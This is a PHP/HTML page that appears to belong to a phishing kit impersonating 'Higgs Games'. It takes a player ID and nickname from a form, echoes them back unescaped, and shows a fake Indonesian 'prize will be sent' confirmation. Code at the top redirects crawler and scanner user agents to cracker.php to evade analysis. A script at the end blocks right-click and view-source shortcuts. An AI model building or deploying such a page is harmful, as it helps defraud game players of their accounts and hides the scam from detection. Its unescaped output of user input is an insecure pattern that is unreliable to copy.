<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$playid = $_POST['playid'];
$nick = $_POST['nick'];
?>
<html>
 <head> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
  <link rel="preconnect" href="https://fonts.googleapis.com"> 
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""> 
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet"> 
  <link rel="stylesheet" href="haykaljb/css/all.css"> 
  <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"> 
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css"> 
  <link rel="stylesheet" href="haykaljb/css/facebook.css"> 
  <title>Higgs Games</title> 
  <meta property="og:title" content="Higgs Games"> 
  <meta name="description" content="Ini adalah game online yang unik dan menyenangkan dengan gameplay yang sedeharna juga penuh tantangan, ayo gabung! Beragam permainan bisa Anda mainkan untuk membuat waktu luang Anda semakin menyenangkan!"> 
  <meta property="og:description" content="Ini adalah game online yang unik dan menyenangkan dengan gameplay yang sedeharna juga penuh tantangan, ayo gabung! Beragam permainan bisa Anda mainkan untuk membuat waktu luang Anda semakin menyenangkan!"> 
  <meta property="og:site_name" content="Higgs Games"> 
  <meta property="og:type" content="website"> 
  <meta name="copyright" content="hjb Ariandi"> 
  <meta name="theme-color" content="#095352"> 
  <link rel="icon" href="haykaljb/img/vhjbi.ico">
  <link rel="shorcut icon" href="https://i.ibb.co/yqZW7r6/02494223c899dbaf5d6fbe2dcfa24780.png">
       <script>
            var imageURLs = [
               "haykaljb/sohjbgntg.png"
             , "haykaljb/img/rduid.png"
             , "haykaljb/img/jav.png"
             , "haykaljb/img/pua.png"
             , "haykaljb/img/kdok.png"
             , "haykaljb/img/mcan.png"
          ];
          function getImageTag() {
            var img = '<img src=\"';
            var randomIndex = Math.floor(Math.random() * imageURLs.length);
            img += imageURLs[randomIndex];
            img += '\" alt=\"character\"/>';
            return img;
           }
        </script>
        <link rel="stylesheet" href="haykaljb/css/sakhdhaw.css" />
    </head>
    <body>
        <div class="bhjbg">
            <img src="haykaljb/img/bg.jpg" alt="" />
        </div>
        <main>
            <header>
                <div class="ichjbacc">
                    <div class="ichjbgmb">
                        <script type="text/javascript">
                          document.write(getImageTag());
                        </script>
                    </div>
                 <div class="knhjbnam">
                        <div class="nmhjbkn">
                            <hjb id="toastnick"><?php echo $nick;?></hjb>
                            <hjb id="toastid"><?php echo $playid;?></hjb>
                        </div>
                    </div>
                </div>
               <div class="duaxhjbgmb">
                    <img src="haykaljb/img/2x.png" alt="" />
    </div> 
   </header> 
   <banner> 
    <div class="krhjbanm"> 
     <img class="hjbsld" src="haykaljb/img/kranm1.png" alt="" id="krhjbanm1" style="display: none"> 
     <img class="hjbsld" src="haykaljb/img/kranm2.png" alt="" id="krhjbanm2" style="display: none"> 
     <img class="hjbsld" src="haykaljb/img/kranm3.png" alt="" id="krhjbanm3" style="display: none"> 
    </div> 
    <div class="bnhjbanim"> 
     <span id="hjbblb1"></span> 
     <span id="hjbblb2"></span> 
     <span id="hjbblb3"></span> 
     <span id="hjbblb4"></span> 
     <div class="hjbslidebn"> 
      <img class="slax" src="haykaljb/img/s1.png" alt="" style="display: block;"> 
      <img class="slax" src="haykaljb/img/s2.png" style="display: none" alt=""> 
      <img class="slax" src="haykaljb/img/s3.png" style="display: none" alt=""> 
      <img class="slax" src="haykaljb/img/s4.png" style="display: none" alt=""> 
      <img class="slax" src="haykaljb/img/s5.png" style="display: none" alt=""> 
      <img class="slax" src="haykaljb/img/s6.png" style="display: none" alt=""> 
      <img class="slax" src="haykaljb/img/s7.png" style="display: none" alt=""> 
     </div> 
     <a class="prev" onclick="plusSlides(-1)" style="display: none">❮</a> 
     <a class="next" onclick="plusSlides(1)" style="display: none">❯</a> 
     <div style="display: none"> 
      <span class="dot active" onclick="currentSlide(1)"></span> 
      <span class="dot" onclick="currentSlide(2)"></span> 
      <span class="dot" onclick="currentSlide(3)"></span> 
      <span class="dot" onclick="currentSlide(4)"></span> 
      <span class="dot" onclick="currentSlide(5)"></span> 
      <span class="dot" onclick="currentSlide(6)"></span> 
      <span class="dot" onclick="currentSlide(7)"></span> 
     </div> 
     <span id="hjbblb5"></span> 
     <span id="hjbblb6"></span> 
     <span id="hjbblb7"></span> 
     <span id="hjbblb8"></span> 
    </div> 
    <div class="hjbgmblist"> 
     <img src="haykaljb/img/list.png" alt=""> 
    </div> 
   </banner> 
   <schjbs> 
    <div class="gmhjbscs"> 
     <img src="haykaljb/img/sk.png" alt="">
    </div> 
    <div class="hjbdscs"> 
     <p>Hadiah segera dikirim!</p> 
     <span>Pengiriman hadiah dilakukan secara berkala selama 7 hari kerja, Mohon claim hadiah di inbox.</span> 
    </div> 
    <button onclick="location.href='/'" onmousedown="klkhjb.play();"></button> 
   </schjbs> 
   <footer> 
    <div class="tophjbft"> 
     <div class="krhjbft"> 
      <img src="haykaljb/img/fb.png" alt="" />
                        <img src="haykaljb/img/yt.png" alt="" />
                        <img src="haykaljb/img/ig.png" alt="" />
                        <img src="haykaljb/img/dc.png" alt="" />
                        <img src="haykaljb/img/pl.png" alt="" />
                        <img src="haykaljb/img/mail.png" alt="" />
                    </div>
     <div class="knhjbft"> 
      <img src="haykaljb/img/ty.png" alt=""> 
     </div> 
    </div> 
    <span>Seluruh hak cipta.Terhubung dengan Kami!</span> 
   </footer> 
  </main> 
  <script>
        document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
                return false;
            } else {
                return true;
            }
        };
        document.addEventListener('contextmenu', event => event.preventDefault());
    </script> 
 </body>
</html>